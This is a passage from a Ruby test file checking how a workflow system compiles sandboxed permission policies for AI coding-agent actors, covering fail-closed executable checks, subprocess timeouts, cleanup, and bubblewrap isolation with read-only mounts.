        Hive::WorkflowPackage::RuntimePolicy.compile_actor(
          { "preset" => "scoped", "tools" => [ "Read", "Write" ] },
          task_folder: task,
          package_root: package,
          profile: Hive::AgentProfiles.lookup(:codex),
          prepare: false
        )
      end
      assert_includes error.message, "path-qualified Edit"
    end
  end

  def test_failed_portable_compile_cleans_runtime_even_when_cleanup_reports_missing
    with_tmp_dir do |dir|
      task = File.join(dir, "task")
      package = File.join(dir, "package")
      output = File.join(task, "article.md")
      FileUtils.mkdir_p([ task, package ])
      removed = []
      original_remove = FileUtils.method(:remove_entry_secure)
      remove_then_missing = lambda do |path|
        original_remove.call(path)
        removed << path
        raise Errno::ENOENT, path
      end
      reset_codex_executable_cache

      error = with_replaced_singleton_method(
        FileUtils, :remove_entry_secure, remove_then_missing
      ) do
        with_env("HIVE_CODEX_BIN" => File.join(dir, "missing-codex")) do
          assert_raises(Hive::ConfigError) do
            Hive::WorkflowPackage::RuntimePolicy.compile_actor(
              {
                "preset" => "scoped",
                "tools" => [ "Read", "Edit(./article.md)" ]
              },
              task_folder: task,
              package_root: package,
              profile: Hive::AgentProfiles.lookup(:codex),
              managed_outputs: [ output ]
            )
          end
        end
      end

      assert_includes error.message, "unavailable managed executable"
      assert_equal 1, removed.length
      refute File.exist?(removed.first)
    ensure
      reset_codex_executable_cache
    end
  end

  def test_codex_doctor_rejects_malformed_and_unavailable_success_reports
    status = ->(success) {
      Object.new.tap { |value| value.define_singleton_method(:success?) { success } }
    }
    cases = [
      [ "codex-malformed-success", "{", "", status.call(true), "malformed doctor output" ],
      [ "codex-malformed-failure", "{", "doctor failed", status.call(false), "doctor failed" ],
      [
        "codex-missing-runtime", JSON.generate(
          "checks" => {
            "runtime.provenance" => {
              "details" => { "current executable" => "/missing/codex" }
            }
          }
        ), "", status.call(true), "unavailable managed executable"
      ]
    ]

    cases.each do |bin, stdout, stderr, exit_status, expected|
      profile = Object.new
      profile.define_singleton_method(:bin) { bin }
      captured_timeout = nil
      captured_probe_home = nil
      capture = ->(*, timeout_sec:, environment:) {
        captured_timeout = timeout_sec
        captured_probe_home = environment.fetch("CODEX_HOME")
        [ stdout, stderr, exit_status ]
      }
      reset_codex_executable_cache

      error = with_replaced_singleton_method(
        Hive::WorkflowPackage::RuntimePolicy, :capture3_bounded, capture
      ) do
        assert_raises(Hive::ConfigError) do
          Hive::WorkflowPackage::RuntimePolicy.codex_executable(profile)
        end
      end
      assert_includes error.message, expected
      assert_equal Hive::WorkflowPackage::RuntimePolicy::CODEX_DOCTOR_TIMEOUT_SEC,
                   captured_timeout
      refute_nil captured_probe_home
      refute File.exist?(captured_probe_home)
    end
  ensure
    reset_codex_executable_cache
  end

  def test_codex_runtime_root_and_profile_executable_resolution_fail_closed
    with_tmp_dir do |dir|
      root = File.join(dir, "codex-package")
      executable = File.join(root, "bin", "codex")
      FileUtils.mkdir_p([
        File.dirname(executable),
        File.join(root, "codex-resources"),
        File.join(root, "codex-path")
      ])
      File.write(executable, "#!/bin/sh\n")
      FileUtils.chmod(0o755, executable)

      assert_equal root,
                   Hive::WorkflowPackage::RuntimePolicy.codex_runtime_root(executable)

      profile = Object.new
      profile.define_singleton_method(:bin) { "missing-grok-executable" }
      profile.define_singleton_method(:name) { :grok }
      error = assert_raises(Hive::ConfigError) do
        Hive::WorkflowPackage::RuntimePolicy.resolve_profile_executable(profile)
      end
      assert_includes error.message, "executable is unavailable"
    end
  end

  def test_bounded_capture_handles_success_timeout_and_close_errors
    stdout, stderr, status = Hive::WorkflowPackage::RuntimePolicy.capture3_bounded(
      "/bin/sh", "-c", "printf output; printf error >&2",
      timeout_sec: 2
    )
    assert_equal "output", stdout
    assert_equal "error", stderr
    assert status.success?

    error = assert_raises(Timeout::Error) do
      Hive::WorkflowPackage::RuntimePolicy.capture3_bounded(
        "/bin/sh", "-c", 'trap "" TERM; while :; do sleep 1; done',
        timeout_sec: 0.01
      )
    end
    assert_instance_of Timeout::Error, error

    close_calls = 0
    stdin = Object.new
    stdin.define_singleton_method(:close) do
      close_calls += 1
      raise IOError, "already closed" if close_calls > 1
    end
    stdin.define_singleton_method(:closed?) { false }
    out = StringIO.new("out")
    err = StringIO.new("err")
    waiter = Object.new
    waiter.define_singleton_method(:join) { |_timeout| true }
    waiter.define_singleton_method(:value) { status }
    popen = ->(*, **) { [ stdin, out, err, waiter ] }
    captured = with_replaced_singleton_method(Open3, :popen3, popen) do
      Hive::WorkflowPackage::RuntimePolicy.capture3_bounded(
        "ignored", timeout_sec: 1
      )
    end
    assert_equal [ "out", "err", status ], captured
    assert_equal 2, close_calls
  end

  def test_capture_group_cleanup_ignores_already_reaped_process
    waiter = Object.new
    waiter.define_singleton_method(:pid) { 123_456 }
    kill = ->(*_args) { raise Errno::ESRCH }

    result = with_replaced_singleton_method(Process, :kill, kill) do
      Hive::WorkflowPackage::RuntimePolicy.terminate_capture_process_group(waiter)
    end

    assert_nil result
  end

  def test_scoped_grok_actor_rejects_missing_auth_and_supports_read_only_web_mode
    with_tmp_dir do |dir|
      task = File.join(dir, "task")
      package = File.join(dir, "package")
      auth = File.join(dir, "grok-auth.json")
      FileUtils.mkdir_p([ task, package ])

      error = with_available_grok_sandbox do
        with_env(
          "HIVE_GROK_BIN" => "/bin/true",
          "GROK_AUTH_PATH" => File.join(dir, "missing-auth.json")
        ) do
          assert_raises(Hive::ConfigError) do
            Hive::WorkflowPackage::RuntimePolicy.compile_actor(
              "read-only",
              task_folder: task,
              package_root: package,
              profile: Hive::AgentProfiles.lookup(:grok)
            )
          end
        end
      end
      assert_includes error.message, "auth file is unavailable"

      File.write(auth, '{"token":"fixture"}')
      policy = with_available_grok_sandbox do
        with_env(
          "HIVE_GROK_BIN" => "/bin/true",
          "GROK_AUTH_PATH" => auth
        ) do
          Hive::WorkflowPackage::RuntimePolicy.compile_actor(
            {
              "preset" => "scoped",
              "tools" => [ "Read", "WebSearch" ]
            },
            task_folder: task,
            package_root: package,
            profile: Hive::AgentProfiles.lookup(:grok)
          )
        end
      end

      refute policy.host_outputs?
      refute_includes policy.cli_flags, "--disable-web-search"
      refute_includes policy.cli_flags, "--json-schema"
      assert_equal 1, policy.cleanup_paths.length
      assert File.directory?(policy.cleanup_paths.first)
    ensure
      policy&.cleanup!
    end
  end

  def test_scoped_grok_actor_rejects_missing_bubblewrap
    with_tmp_dir do |dir|
      task = File.join(dir, "task")
      package = File.join(dir, "package")
      FileUtils.mkdir_p([ task, package ])

      sandbox = Hive::WorkflowPackage::RuntimePolicy::GROK_SANDBOX_PATH
      original_file = File.method(:file?)
      file_check = ->(path) { path == sandbox ? false : original_file.call(path) }

      error = with_replaced_singleton_method(File, :file?, file_check) do
        assert_raises(Hive::ConfigError) do
          Hive::WorkflowPackage::RuntimePolicy.compile_actor(
            "read-only",
            task_folder: task,
            package_root: package,
            profile: Hive::AgentProfiles.lookup(:grok)
          )
        end
      end
      assert_includes error.message, "requires bubblewrap"
    end
  end

  def test_scoped_grok_actor_is_wrapped_in_bubblewrap_with_isolated_home
    with_tmp_dir do |dir|
      task = File.join(dir, "task")
      package = File.join(dir, "package")
      worktree = File.join(dir, "repository-worktree")
      auth = File.join(dir, "grok-auth.json")
      FileUtils.mkdir_p([ task, package, worktree ])
      File.write(auth, '{"token":"fixture"}')
      output = File.join(task, "reviews", "adversarial-01.md")

      policy = with_available_grok_sandbox do
        with_env(
          "HIVE_GROK_BIN" => "/bin/true",
          "GROK_AUTH_PATH" => auth
        ) do
          Hive::WorkflowPackage::RuntimePolicy.compile_actor(
            {
              "preset" => "scoped",
              "tools" => [ "Read", "LS", "Grep", "Glob", "Edit(./reviews/**)" ]
            },
            task_folder: task,
            package_root: package,
            profile: Hive::AgentProfiles.lookup(:grok),
            base_add_dirs: [ worktree ],
            managed_outputs: [ output ]
          )
        end
      end

      assert_equal "/usr/bin/bwrap", policy.command_prefix.first
      assert_includes policy.command_prefix, "--ro-bind"
      assert_includes policy.command_prefix, File.realpath(task)
      worktree_mount = policy.command_prefix.each_cons(3).find do |flag, source, target|
        flag == "--ro-bind" && source == File.realpath(worktree) && target == source
      end
      refute_nil worktree_mount, "the repository worktree must be mounted read-only"
      assert_equal "/runtime-home", policy.environment.fetch("HOME")
      assert_equal "/usr/local/bin/grok", policy.executable
      assert_includes policy.cli_flags, "--json-schema"
      assert_includes policy.cli_flags, "--disable-web-search"
      assert_equal [ "reviews/adversarial-01.md" ], policy.output_paths.keys
    ensure
      policy&.cleanup!
    end
  end

  private

  def permissions
    {
      "tools" => %w[Read Grep Bash WebFetch],
      "deny" => %w[Write Edit WebSearch],
      "directories" => [ "reports" ],
      "commands" => [ "git status", "git diff *" ],
      "domains" => [ "api.example.com" ],
      "credentials" => [],
      "shell_justification" => "inspect repository state",
      "network_justification" => "fetch the declared API"
    }
  end

  def run_hook(policy, tool_name, tool_input)
    input = JSON.generate("tool_name" => tool_name, "tool_input" => tool_input)
    output = StringIO.new
    Hive::Scripts::WorkflowPolicyHook.run(
      policy.policy_path, input: StringIO.new(input), output: output
    )
    JSON.parse(output.string)
  end

  def reset_codex_executable_cache
    Hive::WorkflowPackage::RuntimePolicy.instance_variable_set(:@codex_executables, {})
  end

  def compile_two_output_codex_policy(task:, package:, article:)
    with_env("HIVE_CODEX_BIN" => "/bin/true") do
      Hive::WorkflowPackage::RuntimePolicy.compile_actor(
        {
          "preset" => "scoped",
          "tools" => [ "Read", "Edit(./article.md)", "Edit(./verification.md)" ]
        },
        task_folder: task,
        package_root: package,
        profile: Hive::AgentProfiles.lookup(:codex),
        managed_outputs: [ article ]
      )
    end
  end

  def managed_output_result(files)
    {
      status: :ok,
      final_message: JSON.generate("files" => files),
      final_message_truncated: false
    }
  end

  def with_available_grok_sandbox
    sandbox = Hive::WorkflowPackage::RuntimePolicy::GROK_SANDBOX_PATH
    original_file = File.method(:file?)
    original_executable = File.method(:executable?)
    file_check = ->(path) { path == sandbox || original_file.call(path) }
    executable_check = ->(path) { path == sandbox || original_executable.call(path) }

    with_replaced_singleton_method(File, :file?, file_check) do
      with_replaced_singleton_method(File, :executable?, executable_check) { yield }
    end
  end
end
